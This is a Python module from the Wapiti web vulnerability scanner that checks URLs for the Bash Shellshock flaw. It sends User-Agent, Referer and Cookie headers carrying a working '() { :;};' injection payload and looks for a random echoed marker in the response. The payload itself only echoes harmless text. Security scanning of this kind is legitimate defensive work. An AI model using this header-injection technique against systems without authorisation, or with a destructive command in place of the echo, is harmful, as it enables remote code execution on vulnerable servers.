#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This file is part of the Wapiti project (http://wapiti.sourceforge.net)
# Copyright (C) 2014 Nicolas Surribas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
from wapitiCore.attack.attack import Attack
from wapitiCore.language.vulnerability import Vulnerability
import socket
import os
from wapitiCore.net import HTTP
import random
import string


class mod_shellshock(Attack):
    """
    This class implements a "bash shellshock" vulnerability tester"
    """

    name = "shellshock"

    doGET = False
    doPOST = False

    def __init__(self, http, xmlRepGenerator):
        Attack.__init__(self, http, xmlRepGenerator)
        empty_func = "() { :;}; "

        self.random_bytes = [random.choice(string.hexdigits) for _ in range(32)]
        bash_string = ""
        for c in self.random_bytes:
            bash_string += "\\x" + c.encode("hex_codec")

        cmd = "echo; echo; echo -e '{0}';".format(bash_string)

        self.hdrs = {
            "user-agent": empty_func + cmd,
            "referer": empty_func + cmd,
            "cookie": empty_func + cmd
        }

    def attackGET(self, http_res):
        url = http_res.path

        if self.verbose == 2:
            print(u"+ {0}".format(url))

        if url not in self.attackedGET:
            self.attackedGET.append(url)
            try:
                evil_req = HTTP.HTTPResource(url)

                resp = self.HTTP.send(evil_req, headers=self.hdrs)
                data, code = resp.getPageCode()
                if "".join(self.random_bytes) in data:
                    self.logR(_("URL {0} seems vulnerable to Shellshock attack !").format(url))

                    self.logVuln(category=Vulnerability.EXEC,
                                 level=Vulnerability.HIGH_LEVEL,
                                 request=evil_req,
                                 info=_("URL {0} seems vulnerable to Shellshock attack").format(url))

            except socket.timeout:
                return
